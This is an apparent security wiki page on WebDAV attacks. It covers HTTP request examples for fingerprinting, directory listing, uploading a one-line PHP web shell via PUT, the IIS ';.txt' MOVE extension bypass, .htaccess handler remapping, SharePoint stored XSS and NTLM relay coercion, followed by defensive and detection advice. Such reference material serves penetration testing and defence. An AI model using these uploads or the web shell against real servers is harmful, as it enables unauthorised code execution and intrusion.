---
title: WebDAV attacks
slug: webdav-attacks
---

> **TL;DR:** WebDAV (PUT/MOVE/COPY/PROPFIND) on an IIS/Apache/nginx mount lets attackers drop executable files past the upload code, list directories, and pivot via xml entity / lock-token bugs.

## What it is
WebDAV is an HTTP extension (RFC 4918) that adds methods for filesystem-like operations: PUT (write), DELETE, MOVE, COPY, MKCOL (mkdir), PROPFIND (list/stat), PROPPATCH (metadata), LOCK / UNLOCK. Servers expose WebDAV in many forms — IIS WebDAV module, Apache `mod_dav`, nginx `nginx-dav-ext-module`, SharePoint, Subversion `mod_dav_svn`, Nextcloud / ownCloud. When enabled (sometimes by default on legacy IIS) and not auth-gated, attackers drop web shells, replace HTML, or list arbitrary parts of the tree.

## Preconditions / where it applies
- WebDAV enabled on the target. Fingerprint with `OPTIONS / HTTP/1.1` and look for `DAV: 1, 2, 3` and the `Allow: PUT, DELETE, MOVE, COPY, MKCOL, PROPFIND` list.
- Either: no auth required, weak basic creds (Digest is also common), or authenticated-but-untrusted users.
- The DAV root maps onto a directory where uploaded files can execute or be served as content.

## Technique

**Fingerprint.**

```http
OPTIONS / HTTP/1.1
Host: target
```

Response includes `Allow:` and `DAV:` headers. `davtest` and `cadaver` are the canonical CLI tools.

**Directory listing via PROPFIND** (works without auth on many setups):

```http
PROPFIND / HTTP/1.1
Host: target
Depth: 1
Content-Length: 0
```

Returns XML with all child URIs.

**Upload a shell with PUT.**

```http
PUT /shell.txt HTTP/1.1
Host: target
Content-Length: 27

<?php system($_GET['c']); ?>
```

If the server blocks `.php` on PUT (classic IIS), upload `.txt` then MOVE:

```http
MOVE /shell.txt HTTP/1.1
Host: target
Destination: http://target/shell.aspx;.txt
```

The `;.txt` trick (IIS 6 legacy) hits the ASP handler. Same family: `.asp;jpg`, `.aspx::$DATA`. See [[file-upload]].

**.htaccess upload** to re-map handlers in directories the attacker can write to:

```
AddType application/x-httpd-php .gif
```

then upload `shell.gif`.

**Apache `mod_dav` + XML entity expansion.** PROPPATCH XML bodies were vulnerable to XXE in old `mod_dav` (CVE-2017-15715-adjacent). See [[xxe]].

**SharePoint WebDAV.** `https://target/personal/USER/Documents/...` exposes WebDAV by default; with low-priv creds, drop a `.html` containing `<script>` for stored XSS that runs in `*.sharepoint.com` (cross-site within tenant).

**WebDAV NTLM relay.** Windows WebClient automatically authenticates with NTLM to UNC paths fronted by WebDAV — `\\attacker@80\share` from a forced PROPFIND triggers NTLM coercion (PetitPotam / PrinterBug-style chains).

## Detection and defence
- Disable WebDAV unless explicitly required (IIS Server Manager → remove WebDAV Authoring Rules; Apache `LoadModule dav_module` off).
- If required: require auth (Negotiate or strong Basic over TLS), restrict methods (`<LimitExcept GET POST OPTIONS PROPFIND>`), and bind the DAV directory away from any executable handler.
- Set `Content-Type` headers, `X-Content-Type-Options: nosniff`, and disable handler mapping for the DAV root.
- IIS: explicitly block extensions `php`, `aspx`, `asp`, `jsp`, and the `;` trick at the URL-rewrite layer.
- Detection: PROPFIND with `Depth: infinity` from non-corporate IPs, large PUT bursts, MOVE chains.

See also [[file-upload]], [[xxe]], [[path-traversal]].

## References
- [RFC 4918 – HTTP Extensions for WebDAV](https://www.rfc-editor.org/rfc/rfc4918) — normative
- [HackTricks – WebDAV](https://book.hacktricks.wiki/en/network-services-pentesting/put-method-webdav.html) — exploitation patterns
- [PayloadsAllTheThings – Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) — extension/parser tricks
